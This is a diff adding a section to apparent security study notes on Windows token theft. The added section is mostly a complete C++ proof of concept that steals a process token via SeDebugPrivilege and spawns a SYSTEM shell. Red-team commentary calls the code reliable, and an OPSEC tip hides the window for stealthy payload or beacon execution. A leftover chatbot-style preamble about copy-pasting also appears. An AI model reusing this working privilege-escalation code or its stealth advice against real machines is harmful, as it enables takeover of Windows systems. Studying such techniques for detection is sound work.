@@ -367,6 +367,153 @@ Once `SeDebugPrivilege` is active, the attacker can bypass Windows ACLs to open 
 > - `DuplicateTokenEx()`: Creates a new primary token (`hDupToken`) based on `winlogon.exe`'s token. You cannot use the original token directly to create a process; it must be duplicated into a primary token.
 > - `CreateProcessWithTokenW()`: Spawns `cmd.exe`. Instead of using the attacker's token, it uses the `hDupToken` (SYSTEM token). The resulting `cmd.exe` window runs as `NT AUTHORITY\SYSTEM`.
 
+Here is the English explanation of the code, formatted perfectly so you can copy and paste it directly into your note.
+
+***
+
+> [!example]+ Advanced PoC: SYSTEM Shell via Token Impersonation & Session Fixing
+> This code is a significant upgrade from basic token theft PoCs. It addresses real-world Windows security boundaries like Session 0 Isolation and provides accurate error handling, making it a highly reliable Red Team tool.
+> 
+> ```cpp
+> #include <windows.h>
+> #include <iostream>
+> #include <wtsapi32.h> 
+> #pragma comment(lib, "Wtsapi32.lib")
+> 
+> void PrintCurrentUser() {
+>     wchar_t username[256];
+>     DWORD size = sizeof(username) / sizeof(username[0]);
+>     if (GetUserNameW(username, &size)) {
+>         std::wcout << L"[+] Current user is: " << username << std::endl;
+>     }
+> }
+> 
+> bool EnableDebugPrivilege() {
+>     HANDLE hToken;
+>     TOKEN_PRIVILEGES tp;
+>     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+>         return false;
+>     }
+>     if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
+>         CloseHandle(hToken);
+>         return false;
+>     }
+>     tp.PrivilegeCount = 1;
+>     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+> 
+>     AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+>     bool success = (GetLastError() == ERROR_SUCCESS);
+>     CloseHandle(hToken);
+>     return success;
+> }
+> 
+> int wmain(int argc, wchar_t** argv)
+> {
+>     if (argc < 2) {
+>         std::wcerr << L"[-] Usage: " << argv[0] << L" <PID>" << std::endl;
+>         return 1;
+>     }
+>     PrintCurrentUser();
+> 
+>     if (EnableDebugPrivilege()) {
+>         std::cout << "[+] SeDebugPrivilege enabled!" << std::endl;
+>     }
+>     else {
+>         std::cerr << "[!] Warning: Failed to enable SeDebugPrivilege. Run as Administrator!" << std::endl;
+>     }
+> 
+>     DWORD pid = _wtoi(argv[1]);
+>     if (pid == 0) {
+>         std::cerr << "[-] Invalid PID provided." << std::endl;
+>         return 1;
+>     }
+> 
+>     HANDLE hToken = NULL;
+>     HANDLE hDupToken = NULL;
+> 
+>     HANDLE hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
+>     if (!hprocess) {
+>         std::cerr << "[-] OpenProcess failed: " << GetLastError() << std::endl;
+>         return 1;
+>     }
+>     std::cout << "[+] OpenProcess() success!" << std::endl;
+>     if (!OpenProcessToken(hprocess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &hToken)) {
+>         std::cerr << "[-] OpenProcessToken failed: " << GetLastError() << std::endl;
+>         CloseHandle(hprocess);
+>         return 1;
+>     }
+>     std::cout << "[+] OpenProcessToken() success!" << std::endl;
+> 
+>     // ========================================================================
+>     // Token Impersonation Validation
+>     // ========================================================================
+>     if (ImpersonateLoggedOnUser(hToken)) {
+>         std::cout << "[+] ImpersonatedLoggedOnUser() success!" << std::endl;
+>         PrintCurrentUser();
+> 
+>         std::cout << "[+] Reverting thread to original user context" << std::endl;
+>         // Revert thread back to the original user context
+>         RevertToSelf();
+>     }
+>     else {
+>         std::cerr << "[-] ImpersonateLoggedOnUser failed: " << GetLastError() << std::endl;
+>     }
+>     if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
+>         std::cerr << "[-] DuplicateTokenEx failed: " << GetLastError() << std::endl;
+>         CloseHandle(hToken);
+>         CloseHandle(hprocess);
+>         return 1;
+>     }
+>     std::cout << "[+] DuplicateTokenEx() success!" << std::endl;
+> 
+>     // ========================================================================
+>     // Session 0 Isolation Fix
+>     // ========================================================================
+>     DWORD sessionId = WTSGetActiveConsoleSessionId();
+>     if (!SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(DWORD))) {
+>         std::cerr << "[!] Warning: Failed to set Session ID. Error: " << GetLastError() << std::endl;
+>     }
+> 
+>     STARTUPINFOW si;
+>     PROCESS_INFORMATION pi;
+>     ZeroMemory(&si, sizeof(STARTUPINFOW));
+>     si.cb = sizeof(STARTUPINFOW);
+> 
+>     wchar_t desktop[] = L"WinSta0\\Default";
+>     si.lpDesktop = desktop;
+> 
+>     ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+> 
+>     if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
+>         std::cout << "[+] Process spawned!" << std::endl;
+>         CloseHandle(pi.hProcess);
+>         CloseHandle(pi.hThread);
+>     }
+>     else {
+>         std::cerr << "[-] CreateProcessWithTokenW failed: " << GetLastError() << std::endl;
+>     }
+>     
+>     // Cleanup
+>     CloseHandle(hToken);
+>     CloseHandle(hDupToken);
+>     CloseHandle(hprocess);
+>     return 0;
+> }
+> ```
+
+> [!tip] Why This Code is Superior (Red Team Perspective)
+> 1. **Session 0 Isolation Fix** (`WTSGetActiveConsoleSessionId`)**:** In Windows, services and system processes run in Session 0, while user processes run in Session 1+. If you steal a token from a Session 0 process and spawn `cmd.exe`, it will be invisible to the user. This code extracts the active console session ID and uses `SetTokenInformation` to patch the duplicated token, ensuring the spawned process appears on the user's active desktop.
+> 2. **Desktop Visibility (**`WinSta0\\Default`**)**: By explicitly setting `si.lpDesktop` to `WinSta0\\Default`, the code guarantees that the GUI window of the spawned process is bound to the interactive window station and default desktop, making it visible and interactive.
+> 3. **Token Validation** **(**`ImpersonateLoggedOnUser`**)**: Instead of blindly trying to create a process, the code temporarily applies the stolen token to its own thread using `ImpersonateLoggedOnUser`, prints the current user to prove the theft was successful, and then reverts to its original context using `RevertToSelf`. This is exactly how tools like Meterpreter or Cobalt Strike validate `steal_token`.
+> 4. **Accurate Privilege Check (**`GetLastError`**)**: The `AdjustTokenPrivileges` API has a quirk—it returns `TRUE` even if the privilege doesn't exist. This code correctly checks `GetLastError() == ERROR_SUCCESS` to verify that `SeDebugPrivilege` was actually enabled.
+> 5. **CLI & Wide String Support (**`wmain`**)**: Using `wmain` and `wchar_t` makes the tool a proper command-line utility that handles Unicode characters correctly, which is the modern standard for Windows C++ development.
+
+> [!warning] OPSEC Note for Stealth Execution
+> In its current state, this code spawns a visible `cmd.exe` window. For completely stealthy execution (e.g., running a beacon or a hidden payload), you must add the following lines to the `STARTUPINFOW` structure before calling `CreateProcessWithTokenW`:
+> ```cpp
+> si.dwFlags = STARTF_USESHOWWINDOW;
+> si.wShowWindow = SW_HIDE; // Hides the window
+> ```
 ## 4. Detection & Threat Hunting
 
 > [!warning] Windows Event Codes
